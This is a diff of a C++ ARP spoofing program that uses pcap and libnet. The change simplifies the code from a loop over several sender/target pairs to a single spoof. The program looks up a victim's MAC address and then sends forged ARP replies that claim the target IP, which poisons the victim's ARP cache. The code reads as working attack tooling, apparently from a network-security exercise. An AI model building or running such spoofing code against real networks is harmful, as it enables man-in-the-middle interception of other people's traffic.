@@ -1,7 +1,6 @@
 #include <cstdio>
 #include <pcap.h>
 #include <libnet.h>
-#include <netinet/ether.h>
 #include <netinet/ip.h>
 #include <arpa/inet.h>
 #include <sys/ioctl.h>
@@ -86,12 +85,14 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
     while (true) {
         struct pcap_pkthdr* header;
         const u_char* responsePacket;
-        int res2 = pcap_next_ex(handle, &header, &responsePacket);
-        if (res2 == 0) continue;
-        if (res2 == -1 || res2 == -2) {
-            printf("pcap_next_ex return %d(%s)\n", res2, pcap_geterr(handle));
+        int res = pcap_next_ex(handle, &header, &responsePacket);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
             return false;
         }
+        
+        // detection for eth-arp packet(sender'sip)
         EthArpPacket* recvPacket = (EthArpPacket*)responsePacket;
         if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
             continue;
@@ -103,7 +104,7 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
             continue;
         }
 
-        memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); // senderMac update
+        memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); 
         memcpy(&packet.eth_.dmac_, &recvPacket->eth_.smac_, MAC_SIZE);
         return true;
     }
@@ -135,7 +136,7 @@ int main(int argc, char* argv[]) {
     EthArpPacket myPacket;
 
     //config default
-
+	
 	myPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // 1 : broadcast 2 : sender mac
 	// myPacket.eth_.smac_ = Mac(); -> config after getMyMac()
 	myPacket.eth_.type_ = htons(EthHdr::Arp);
@@ -150,32 +151,26 @@ int main(int argc, char* argv[]) {
 	myPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
 	myPacket.arp_.tip_ = htonl(Ip(argv[2]));
 
-    if(getMyMac(dev, myPacket) == -1) {
+    // Get network information
+    if(getMyMac(dev, myPacket) == -1 || getMyIp(dev, myPacket) == -1) {
         return -1;
     }
 
-    if(getMyIp(dev, myPacket) == -1) {
+    // Get MAC address of sender
+    if (!getSenderMac(handle, myPacket)) {
+        printf("Failed to get sender MAC address.\n");
         return -1;
     }
 
-    for (int i = 2; i < argc; i += 2) {
-        myPacket.arp_.tip_ = htonl(Ip(argv[i])); // senderIp
-
-        if (!getSenderMac(handle, myPacket)) {
-            printf("Failed to get sender MAC address.\n");
-            return -1;
-        }
-		printf("getsendermac done!\n");
-
-
-        myPacket.arp_.sip_= htonl(Ip(argv[3]));
-        myPacket.arp_.op_ = htons(ArpHdr::Reply); 
-        if (!sendArpSpoof(handle, myPacket)) {
-            printf("Failed to send ARP spoofing packet.\n");
-            return -1;
-        }
-        printf("Spoofed ARP of target %s.\n", argv[i + 1]);
+    // ARP spoof target
+    myPacket.arp_.sip_ = htonl(Ip(argv[3]));
+    myPacket.arp_.op_ = htons(ArpHdr::Reply);
+    if (!sendArpSpoof(handle, myPacket)) {
+        printf("Failed to send ARP spoofing packet.\n");
+        return -1;
     }
+
+    printf("Spoofed ARP of target %s.\n", argv[3]);
 
     pcap_close(handle);
     return 0;
